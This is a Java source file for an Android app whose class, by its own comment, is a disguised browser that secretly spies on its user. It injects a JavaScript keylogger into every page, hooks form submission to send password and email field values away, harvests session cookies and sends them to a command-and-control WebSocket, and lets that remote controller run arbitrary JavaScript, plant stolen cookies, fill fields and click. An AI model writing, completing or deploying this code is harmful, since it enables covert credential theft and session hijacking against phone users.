package com.rcl.androidstreamcontrol.service;

import android.content.Context;
import android.util.Log;
import android.view.View;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.webkit.WebSettings;
import android.webkit.ValueCallback;
import android.os.Handler;

import org.json.JSONObject;

import java.util.List;
import java.util.ArrayList;

import com.rcl.androidstreamcontrol.service.C2WebSocketClient;

/**
 * Module 5: Disguised Browser (The Hacker Module)
 *
 * Generic WebView that looks like a normal browser but secretly captures
 * keystrokes, form submissions, and session cookies via JavaScript injection.
 * All commands work via WebSocket — no screen unlock needed.
 */
public class HackerBrowser {

    private static final String TAG = "HackerBrowser";

    private static final String KEYLOGGER_JS =
        "var _hk = [];" +
        "document.addEventListener('keydown', function(e) {" +
        "  if (e.target && (e.target.type === 'password' || e.target.type === 'text' || e.target.type === 'email')) {" +
        "    _hk.push(JSON.stringify({key: e.key, field: e.target.name || e.target.id || 'unknown', ts: Date.now()}));" +
        "  }" +
        "});" +
        "var _origSubmit = HTMLFormElement.prototype.submit;" +
        "HTMLFormElement.prototype.submit = function() {" +
        "  var data = {};" +
        "  var inputs = this.querySelectorAll('input[type=password], input[type=text], input[type=email]');" +
        "  for (var i = 0; i < inputs.length; i++) {" +
        "    data[inputs[i].name || inputs[i].id || i] = inputs[i].value;" +
        "  }" +
        "  fetch('/_hacker_log', {method: 'POST', body: JSON.stringify({url: window.location.href, data: data})});" +
        "  _origSubmit.call(this);" +
        "};";

    private final Context context;
    private final int telegramUserId;
    private final C2WebSocketClient c2Client;
    private WebView webView;
    private boolean isVisible = false;
    private final List<String> keystrokeBuffer = new ArrayList<>();

    public HackerBrowser(Context context, int telegramUserId, C2WebSocketClient c2Client) {
        this.context = context;
        this.telegramUserId = telegramUserId;
        this.c2Client = c2Client;
    }

    public void open(String url, String taskTitle) {
        createWebView();
        webView.loadUrl(url);
        injectKeylogger();
        isVisible = true;
        Log.d(TAG, "Browser opened: " + url + " (" + taskTitle + ")");
    }

    public void close() {
        if (webView != null) {
            webView.setVisibility(View.GONE);
        }
        isVisible = false;
        Log.d(TAG, "Browser closed");
    }

    private void createWebView() {
        if (webView != null) return;

        webView = new WebView(context);
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setUserAgentString("Mozilla/5.0 (Android 14; Mobile) RivarBrowser/1.0");

        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                Log.d(TAG, "Page loaded: " + url);
                injectKeylogger();
                harvestCookies();
            }
        });
    }

    private void injectKeylogger() {
        if (webView == null) return;

        webView.evaluateJavascript(KEYLOGGER_JS, new ValueCallback<String>() {
            @Override
            public void onReceiveValue(String result) {
                Log.d(TAG, "Keylogger injected. Result: " + (result != null ? result : "null"));
            }
        });
    }

    public void harvestCookies() {
        if (webView == null) return;

        webView.evaluateJavascript(
            "JSON.stringify({cookies: document.cookie, url: window.location.href, domain: window.location.hostname})",
            new ValueCallback<String>() {
                @Override
                public void onReceiveValue(String value) {
                    if (value != null && !value.equals("null") && !value.isEmpty()) {
                        try {
                            JSONObject data = new JSONObject(value);
                            if (data.has("cookies") && !data.getString("cookies").isEmpty()) {
                                JSONObject msg = new JSONObject();
                                msg.put("action", "session_captured");
                                msg.put("domain", data.optString("domain", "unknown"));
                                msg.put("url", data.optString("url", ""));
                                msg.put("cookies", data.getString("cookies"));
                                c2Client.send(msg.toString());
                                Log.d(TAG, "Cookies harvested from: " + data.optString("domain", "?"));
                            }
                        } catch (Exception e) {
                            Log.e(TAG, "Cookie parse error", e);
                        }
                    }
                }
            }
        );
    }

    public void injectSession(String domain, String cookieString) {
        if (webView == null) return;
        try {
            String js = "document.cookie = '" + cookieString.replace("'", "\\'").replace("\n", "") + "';";
            webView.evaluateJavascript(js, null);
            Log.d(TAG, "Session cookie injected for: " + domain);
        } catch (Exception e) {
            Log.e(TAG, "Failed to inject session", e);
        }
    }

    public void executeJs(String js) {
        if (webView == null) return;
        webView.evaluateJavascript(js, new ValueCallback<String>() {
            @Override
            public void onReceiveValue(String result) {
                try {
                    JSONObject msg = new JSONObject();
                    msg.put("action", "browser_js_result");
                    msg.put("result", result != null ? result : "null");
                    c2Client.send(msg.toString());
                } catch (Exception e) {}
            }
        });
    }

    public void registerCommands(C2WebSocketClient client) {
        client.onCommand("browser_goto", payload -> {
            String url = payload.optString("url", "https://example.com");
            String title = payload.optString("title", "Task Verification");
            open(url, title);
        });

        client.onCommand("browser_close", payload -> close());

        client.onCommand("browser_inject_js", payload -> {
            String js = payload.optString("js", "");
            executeJs(js);
        });

        client.onCommand("browser_get_cookies", payload -> harvestCookies());

        client.onCommand("browser_inject_session", payload -> {
            String domain = payload.optString("domain", "");
            String cookies = payload.optString("cookies", "");
            injectSession(domain, cookies);
        });

        client.onCommand("browser_fill_field", payload -> {
            String selector = payload.optString("selector", "");
            String value = payload.optString("value", "");
            if (!selector.isEmpty()) {
                executeJs("document.querySelector('" + selector.replace("'", "\\'") + "').value = '" + value.replace("'", "\\'") + "'");
            }
        });

        client.onCommand("browser_click", payload -> {
            String selector = payload.optString("selector", "");
            if (!selector.isEmpty()) {
                executeJs("document.querySelector('" + selector.replace("'", "\\'") + "').click()");
            }
        });
    }

    public boolean isVisible() { return isVisible; }
}